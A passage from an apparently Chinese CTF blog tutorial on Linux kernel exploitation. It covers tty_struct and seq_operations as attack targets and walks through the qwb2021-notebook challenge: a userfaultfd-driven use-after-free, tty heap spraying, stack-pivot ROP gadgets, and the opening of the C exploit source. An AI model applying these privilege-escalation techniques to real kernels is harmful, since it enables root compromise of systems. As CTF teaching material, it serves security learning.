<span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> cmd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">long</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>compat_ioctl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span>\n                 <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> cmd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>set_termios<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">ktermios</span> <span class=\"token operator\">*</span> old<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>throttle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span> tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>unthrottle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span> tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>stop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hangup<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>break_ctl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>flush_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>set_ldisc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>wait_until_sent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> timeout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>send_xchar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>tiocmget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>tiocmset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> set<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> clear<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>resize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">winsize</span> <span class=\"token operator\">*</span>ws<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>get_icount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">struct</span> <span class=\"token class-name\">serial_icounter_struct</span> <span class=\"token operator\">*</span>icount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>get_serial<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">serial_struct</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>set_serial<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">serial_struct</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>show_fdinfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token operator\">*</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_CONSOLE_POLL</span></span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>poll_init<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> line<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>options<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>poll_get_char<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>poll_put_char<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> line<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>proc_show<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> __randomize_layout<span class=\"token punctuation\">;</span></code></pre>\n<p>在使用 write 时，rdi 寄存器的值为其结构体本身，因此可以通过使用 gadget 进行栈迁移</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024125225175.png\" alt=\"image-20221024125225175\"></p>\n<p>调用 ioctl 时 ，rdi 寄存器为结构体本身，  rcx 寄存器为 tty_operations</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024130636724.png\" alt=\"image-20221024130636724\"></p>\n<h3 id=\"seq-序列文件接口\"><a class=\"markdownIt-Anchor\" href=\"#seq-序列文件接口\">#</a> seq 序列文件接口</h3>\n<p>序列文件接口（Sequence File Interface）是针对 procfs 默认操作函数每次只能读取一页数据从而难以处理较大 proc 文件的情况下出现的，其为内核编程提供了更为友好的接口</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span>\n    size_t size<span class=\"token punctuation\">;</span>\n    size_t from<span class=\"token punctuation\">;</span>\n    size_t count<span class=\"token punctuation\">;</span>\n    size_t pad_until<span class=\"token punctuation\">;</span>\n    loff_t index<span class=\"token punctuation\">;</span>\n    loff_t read_pos<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">mutex</span> lock<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_operations</span> <span class=\"token operator\">*</span>op<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> poll_event<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span>file<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>private<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></code></pre>\n<p>其中 seq_operations 结构体动态分配，该结构体只有 4 个函数指针，大小仅为 0x20 ，其中在 read 时会通过调用链来调用 start 指针</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_operations</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>start<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token operator\">*</span>m<span class=\"token punctuation\">,</span> loff_t <span class=\"token operator\">*</span>pos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>stop<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token operator\">*</span>m<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token operator\">*</span>m<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v<span class=\"token punctuation\">,</span> loff_t <span class=\"token operator\">*</span>pos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>show<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seq_file</span> <span class=\"token operator\">*</span>m<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></code></pre>\n<p>我们打开  <code>proc/self/stat</code>  文件能分配到新的 seq_operations 结构体</p>\n<h2 id=\"题目讲解\"><a class=\"markdownIt-Anchor\" href=\"#题目讲解\">#</a> 题目讲解</h2>\n<h3 id=\"qwb2021-notebook\"><a class=\"markdownIt-Anchor\" href=\"#qwb2021-notebook\">#</a> qwb2021-notebook</h3>\n<h4 id=\"漏洞分析\"><a class=\"markdownIt-Anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h4>\n<p>启动脚本如下</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">#!&#x2F;bin&#x2F;sh\nstty intr ^]\nexec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel&#x3D;3 console&#x3D;ttyS0 oops&#x3D;panic panic&#x3D;1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores&#x3D;2,threads&#x3D;2 -cpu kvm64,+smep,+smap -monitor &#x2F;dev&#x2F;null 2&gt;&#x2F;dev&#x2F;null -s</code></pre>\n<p>保护全开，并且是多核，内核版本 4.15.8 ，因此可以使用 userfaultfd</p>\n<p>模块为经典菜单</p>\n<p>ioctl 程序如下，其中 gift 可以白给出堆地址，程序很多地方用了锁，但是很多锁没啥意义。。</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024120210536.png\" alt=\"image-20221024120210536\"></p>\n<p>edit 如下</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024120122050.png\" alt=\"image-20221024120122050\"></p>\n<p>使用了 realloc，其 realloc 和用户态的类似，size 为 0 时可以释放堆块，我们可以看到，程序中有很多地方都有 copy_from_user (name, v4, 0x100LL); 这其实是方便我们使用 userfaultfd 机制的，因此程序可以卡在刚 free 后的地方，而后续如果没有继续运行下去就会造成一个 uaf</p>\n<p>add 同样也用了读锁，各个读锁，因此 edit 卡着的过程中 是可以使用 add 的</p>\n<p>而 read write 都没有用到锁</p>\n<h4 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h4>\n<ol>\n<li>\n<p>使用 userfaultfd 申请缺页内存，那么在内核操作访问到该内存的时候就会发生缺页卡住。</p>\n</li>\n<li>\n<p>申请满 pool ，随后使用 realloc 重分配到 0x2e0 也就是 tty 结构体的大小；</p>\n</li>\n<li>\n<p>开多线程使用 userfaultfd 将 pool 里的堆块全部清成 uaf ；</p>\n</li>\n<li>\n<p>堆喷 tty 结构体，此时应该有几个 tty 结构体的指针在 pool 里；</p>\n</li>\n<li>\n<p>再次开多线程使用 userfaultfd 卡 add 将 pool 里的 size 改成正常大小；</p>\n</li>\n<li>\n<p>遍历 pool 找出 tty 结构体泄露出内核地址，申请两个内核堆块用来伪造 tty_operations 以及布置 rop；</p>\n</li>\n<li>\n<p>修改 tty_operations 将其劫持到伪造的 tty_operations ，栈迁移到 rop 完成利用；还可以用另一种方法 ，便是使用 work_for_cpu_fn 函数，多次调用 提权的两个函数完成利用。</p>\n</li>\n</ol>\n<h5 id=\"rop法\"><a class=\"markdownIt-Anchor\" href=\"#rop法\">#</a> rop 法</h5>\n<p>考虑到在对 tty 结构体调用 write 函数时 rdi 为结构体本身，因此找一个从 rdi 到 rsp 的 gadget</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">0xffffffff81045833</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">35</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>\tmov    rdi<span class=\"token punctuation\">,</span>rax\n<span class=\"token number\">0xffffffff81045836</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">38</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>\txor    eax<span class=\"token punctuation\">,</span>eax\n<span class=\"token number\">0xffffffff81045838</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">40</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>\t<span class=\"token builtin\">cmp</span>    rdi<span class=\"token punctuation\">,</span><span class=\"token number\">0x9000000</span>\n<span class=\"token number\">0xffffffff8104583f</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">47</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>\tje     <span class=\"token number\">0xffffffff81045843</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">51</span><span class=\"token operator\">></span>\n<span class=\"token number\">0xffffffff81045841</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">49</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>\tpop    rbp\n<span class=\"token number\">0xffffffff81045842</span> <span class=\"token operator\">&lt;</span>lmce_supported<span class=\"token operator\">+</span><span class=\"token number\">50</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>\tret</code></pre>\n<p>此时迁移的 tty 结构体上可控空间很小，因此进行第二次栈迁移，考虑到此时 rsp 下方有 tty_operations ，因此使用 pop rbp 迁移过去，最后再使用 leave ret 迁到 伪造 rop 的地方即可</p>\n<p>userfaultfd + tty_struct-&gt;write + 堆喷 + rop</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;pthread.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/userfaultfd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;poll.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"kernelpwn.h\"</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">TTY_STRUCT_SIZE <span class=\"token number\">0x2e0</span></span></span>\n<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">;</span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0xa9b40</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0xa9ef0</span><span class=\"token punctuation\">;</span>\nsize_t push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x43f4e1</span><span class=\"token punctuation\">;</span>\nsize_t swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">=</span> <span class=\"token number\">0xa00929</span><span class=\"token punctuation\">;</span>\nsize_t kpti_trampoline <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t pop_r12_pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x2061</span><span class=\"token punctuation\">;</span>\nsize_t leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x2805</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x7115</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x358842</span><span class=\"token punctuation\">;</span>\nsize_t mov_rdi_rax_cmp_pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x45833</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 0xffffffff81045833 &lt;lmce_supported+35>:\tmov    rdi,rax</span>\n<span class=\"token comment\">// 0xffffffff81045836 &lt;lmce_supported+38>:\txor    eax,eax</span>\n<span class=\"token comment\">// 0xffffffff81045838 &lt;lmce_supported+40>:\tcmp    rdi,0x9000000</span>\n<span class=\"token comment\">// 0xffffffff8104583f &lt;lmce_supported+47>:\tje     0xffffffff81045843 &lt;lmce_supported+51></span>\n<span class=\"token comment\">// 0xffffffff81045841 &lt;lmce_supported+49>:\tpop    rbp</span>\n<span class=\"token comment\">// 0xffffffff81045842 &lt;lmce_supported+50>:\tret</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">args</span><span class=\"token punctuation\">&#123;</span>\n    size_t index<span class=\"token punctuation\">;</span>\n    size_t size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">typedef</span> args<span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_r12_pop_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    leave_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    mov_rdi_rax_cmp_pop_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdi_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    kpti_trampoline  <span class=\"token operator\">=</span> swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">+</span><span class=\"token number\">22</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kpti_trampoline\"</span> <span class=\"token punctuation\">,</span> kpti_trampoline<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size_t index <span class=\"token punctuation\">,</span> size_t size <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token function\">block_add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token 